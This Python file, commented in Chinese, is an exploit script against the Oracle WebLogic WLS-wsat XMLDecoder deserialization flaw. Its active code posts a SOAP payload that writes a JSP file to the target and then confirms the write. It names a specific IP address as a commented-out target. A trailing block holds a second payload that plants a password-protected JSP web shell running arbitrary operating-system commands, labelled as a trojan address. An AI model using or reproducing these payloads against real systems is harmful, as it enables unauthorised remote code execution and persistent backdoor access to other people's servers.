# coding:utf-8
#针对WebLogic的WLS组件，利用xmldecoder反序列漏洞进行的RCE攻击

import requests
class Exploit:

    def attack(self, url):
        headers = {"Content-Type": "text/xml"}
        exp = '''
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java><java version="1.4.0" class="java.beans.XMLDecoder">
            <object class="java.io.PrintWriter">
                <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/a.jsp</string><void method="println">
                    <string><![CDATA[test WebLogic WLS xmldecoder RCE]]></string></void><void method="close"/>
            </object>
        </java>
      </java>
    </work:WorkContext>
  </soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>
        '''
        try:
            tgtURL = url + '/wls-wsat/CoordinatorPortType'
            res = requests.post(tgtURL, data=exp, headers=headers, timeout=10)
            jsp_path = url + '/bea_wls_internal/a.jsp'
            text = requests.get(jsp_path).text
            if "test WebLogic WLS xmldecoder RCE" in text:
                return "WebLogic WLS xmldecoder RCE ! path : {}".format(jsp_path)
        except:
            return None

# print Exploit().attack("http://207.246.87.203:7001")
'''
        exp = \'\'\'
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java><java version="1.4.0" class="java.beans.XMLDecoder">
            <object class="java.io.PrintWriter">
                <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/a1.jsp</string><void method="println">
                    <string><![CDATA[<%if("023".equals(request.getParameter("pwd"))){  
                        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();  
                        int a = -1;  
                        byte[] b = new byte[2048];  
                        out.print("<pre>");  
                        while((a=in.read(b))!=-1){  
                            out.println(new String(b));  
                        }  
                        out.print("</pre>");} %>]]></string></void><void method="close"/>
            </object>
        </java>
      </java>
    </work:WorkContext>
  </soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>
        \'\'\' 
        木马地址： url + bea_wls_internal/a1.jsp
'''